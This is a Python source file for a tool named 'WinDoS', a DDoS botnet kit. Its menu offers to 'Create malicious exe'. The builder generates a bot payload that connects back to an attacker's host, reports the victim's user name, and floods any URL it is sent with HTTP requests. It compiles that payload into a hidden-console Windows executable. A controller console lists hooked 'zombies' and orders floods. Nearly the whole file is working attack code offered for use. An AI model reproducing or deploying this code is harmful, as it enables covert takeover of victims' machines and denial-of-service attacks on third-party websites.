import threading
import socket
import colorama
import subprocess
import time
from urllib.parse import urlparse
import keyboard
import requests

HOST = "0.0.0.0"
PORT = None

threads = "10"
target = "http://example.com/"
timer = "10"

clients = []
adr = []
handler = False
i = 1
client = None


def split():
    print(colorama.Fore.RED + "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~" +
          colorama.Style.RESET_ALL)


def logo():
    print(colorama.Fore.MAGENTA + r"""
 /$$      /$$ /$$           /$$$$$$$             /$$$$$$ 
| $$  /$ | $$|__/          | $$__  $$           /$$__  $$
| $$ /$$$| $$ /$$ /$$$$$$$ | $$  \ $$  /$$$$$$ | $$  \__/
| $$/$$ $$ $$| $$| $$__  $$| $$  | $$ /$$__  $$|  $$$$$$ 
| $$$$_  $$$$| $$| $$  \ $$| $$  | $$| $$  \ $$ \____  $$
| $$$/ \  $$$| $$| $$  | $$| $$  | $$| $$  | $$ /$$  \ $$
| $$/   \  $$| $$| $$  | $$| $$$$$$$/|  $$$$$$/|  $$$$$$/
|__/     \__/|__/|__/  |__/|_______/  \______/  \______/                                                                                  
""" + colorama.Style.RESET_ALL)


def menu():
    while not handler:
        subprocess.run("cls", shell=True)
        split()
        logo()
        split()
        print(colorama.Fore.GREEN + "(1) Create malicious exe\n(2) Enter control panel\n(3) Exit\n" +
              colorama.Style.RESET_ALL)

        choice = input("Choice: ")
        if choice == "1":
            builder()
        elif choice == "2":
            controller()
        elif choice == "3":
            split()
            subprocess.run("cls", shell=True)
            break
        else:
            split()
            print(colorama.Fore.GREEN + "Invalid choice!" + colorama.Style.RESET_ALL)


def builder():
    try:
        split()
        host = str(input(colorama.Fore.GREEN + "LHOST: " + colorama.Style.RESET_ALL).strip())
        port = int(input(colorama.Fore.GREEN + "LPORT: " + colorama.Style.RESET_ALL).strip())
        split()
        data = f"""
import socket
import threading
import requests
import time
import subprocess

connected = False
timer = False
threads = []

times = None
client = None
url = None


def flooder(targets, threaded, timed):
    global timer, times, threads, url
    url = str(targets)
    threads_num = int(threaded)
    times = int(timed)

    def flood():
        try:
            while timer:
                requests.get(url)
        except requests.RequestException:
            pass

    timer = True
    for request in range(threads_num):
        t = threading.Thread(target=flood)
        t.start()
        threads.append(t)
    time.sleep(times)
    timer = False
    for thread in threads:
        thread.join()


while True:
    while not connected:
        try:
            time.sleep(5)
            client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client.connect(("{host}", {port}))
            if client:
                client.send(subprocess.check_output("whoami", shell=True))
                connected = True  
        except ConnectionError:
            if client:
                client.close()
            pass
        except (AttributeError, socket.error):
            if client:
                client.close()
            pass

    while connected:
        try:
            data = client.recv(4096).decode().strip()
            target, num_threads, times = data.split(',')
            threading.Thread(target=flooder, args=(target, num_threads, times)).start()

        except (KeyboardInterrupt, ConnectionError, ValueError, AttributeError, OSError):
            if client:
                client.close()
            connected = False
            pass
        """
        if host and port and 6 < len(host) < 16 and 0 < port < 65535 and "." in host and "256" not in host and str(
                port).isdigit() and host[0].isdigit:
            file = open("build.py", "w")
            file.write(data)
            file.close()
            subprocess.run("python -m nuitka --onefile --windows-console-mode=disable --mingw64 --standalone build.py", shell=True)
            subprocess.run("del build.py", shell=True)
            subprocess.run("rmdir /S /Q build.build", shell=True)
            subprocess.run("rmdir /S /Q build.dist", shell=True)
            subprocess.run("rmdir /S /Q build.onefile-build", shell=True)
            split()
            print("Press enter to continue...")
            split()
            keyboard.wait("enter")
        else:
            print(colorama.Fore.RED + "Invalid LHOST or LPORT!" + colorama.Style.RESET_ALL)
            split()
            print("Press enter to continue...")
            split()
            keyboard.wait("enter")
    except:
        split()
        print(colorama.Fore.RED + "Invalid LHOST or LPORT!" + colorama.Style.RESET_ALL)
        split()
        print("Press enter to continue...")
        split()
        keyboard.wait("enter")


def controller():
    global handler, target, threads, timer, i, client
    try:
        split()
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.bind((str(HOST), int(PORT)))
        server.listen()

        def zombies():
            print(colorama.Fore.LIGHTBLUE_EX + r"""
            ID            ZOMBIE
            ----          --------""" + colorama.Style.RESET_ALL)

            if adr:
                for connected, address in enumerate(adr, start=1):
                    print(
                        colorama.Fore.LIGHTBLUE_EX + f"""            {str(connected)}             {str(address)}""" + colorama.Style.RESET_ALL)

            else:
                print(
                    colorama.Fore.LIGHTBLUE_EX + """            None          None         
                    """ + colorama.Style.RESET_ALL)

        def options():
            print(colorama.Fore.LIGHTBLUE_EX + f"""
            NAME       VALUE
            -----      -------
            TARGET     {target}
            THREADS    {threads}
            TIME       {timer}
            """ + colorama.Style.RESET_ALL)

        def helper():
            print(colorama.Fore.LIGHTBLUE_EX + r"""
            COMMAND       DESCRIPTION     
            ---------     -------------
            help          show help message
            zombies       list hooked zombies
            options       list current options
            set           set value to option
            run           flood the target
            exit          exit control panel
            """ + colorama.Style.RESET_ALL)

        def handle_clients():
            global i, client
            while handler:
                try:
                    client, addr = server.accept()
                    whoami = client.recv(2048).decode()
                    if client and whoami not in adr:
                        clients.append(client)
                        adr.append(whoami)
                        print(colorama.Fore.LIGHTGREEN_EX + f"\nZOMBIE {i} => {addr[0]}" + colorama.Style.RESET_ALL)
                        i += 1
                except (OSError, ConnectionError):
                    if client:
                        client.close()
                    pass

        handler = True
        handle = threading.Thread(target=handle_clients)
        handle.start()


        def valid_url(url):
            try:
                requests.head(url)
                return True
            except requests.RequestException:
                return False


        def console():
            global i, handler, threads, target, timer, client
            while handler:
                try:
                    command = input("WinDoS> ").lower()
                    if command.lower() == "exit" or command.lower() == "quit" or command.lower() == "bye":
                        handler = False
                        for client in clients:
                            client.close()
                        server.close()
                        adr.clear()
                        clients.clear()
                        i = 1
                    elif command.strip() == "help":
                        helper()
                    elif command.strip() == "zombies" or command.strip() == "sessions":
                        zombies()
                    elif command.strip() == "options":
                        options()
                    elif command.startswith("set "):
                        value = command[4:].strip()
                        if value.lower().startswith("target"):
                            targ = value[6:].strip()
                            if "http" in urlparse(targ).scheme.lower():
                                target = targ
                                print(colorama.Fore.LIGHTBLUE_EX + f"TARGET => {target.strip()}" + colorama.Style.RESET_ALL)
                            else:
                                split()
                                print(colorama.Fore.RED + "Invalid target!" + colorama.Style.RESET_ALL)
                                split()
                        elif value.lower().startswith("threads"):
                            num_threads = value[7:].strip()
                            if num_threads.isdigit():
                                threads = num_threads
                                print(colorama.Fore.LIGHTBLUE_EX + f"THREADS => {threads}" + colorama.Style.RESET_ALL)
                            else:
                                split()
                                print(colorama.Fore.RED + "Invalid threads!" + colorama.Style.RESET_ALL)
                                split()
                        elif value.lower().startswith("time"):
                            num_time = value[4:].strip()
                            if num_time.isdigit():
                                timer = num_time
                                print(colorama.Fore.LIGHTBLUE_EX + f"TIME => {timer}" + colorama.Style.RESET_ALL)
                            else:
                                split()
                                print(colorama.Fore.RED + "Invalid time!" + colorama.Style.RESET_ALL)
                                split()
                    elif command.strip() == "run":
                        if valid_url(target):
                            for client in clients:
                                client.send(f"{target},{threads},{timer}".encode())
                            if clients:
                                print(
                                    colorama.Fore.YELLOW + f"Flooding '{urlparse(target).hostname}' for {timer} seconds..." + colorama.Style.RESET_ALL)
                                time.sleep(int(timer))
                                split()
                            else:
                                split()
                                print(
                                    colorama.Fore.RED + f"No zombies hooked!" + colorama.Style.RESET_ALL)
                                split()
                        else:
                            split()
                            print(
                                colorama.Fore.RED + f"Target not reachable!" + colorama.Style.RESET_ALL)
                            split()

                    else:
                        print(colorama.Fore.RED + f"{command.strip()} is not a command!\nType help to see all commands!" + colorama.Style.RESET_ALL)

                except (ConnectionError, KeyboardInterrupt):
                    for client in clients:
                        client.close()
                    pass

        console()

    except (AttributeError, ConnectionError, OSError):
        pass


def port_selection():
    global PORT
    try:
        PORT = input("Listening port: ")
        if PORT.strip() and 0 < int(PORT) < 65535 and PORT.isdigit():
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.bind((str(HOST), int(PORT)))
                subprocess.run("cls", shell=True)
        else:
            split()
            print(colorama.Fore.RED + "Invalid port!" + colorama.Style.RESET_ALL)
            split()
            port_selection()

    except socket.error:
        split()
        print(colorama.Fore.RED + "Port is already in use!" + colorama.Style.RESET_ALL)
        split()
        port_selection()
    except ValueError:
        split()
        print(colorama.Fore.RED + "Invalid port!" + colorama.Style.RESET_ALL)
        split()
        port_selection()


def main():
    subprocess.run("cls", shell=True)
    port_selection()
    split()
    menu()


if __name__ == '__main__':
    main()

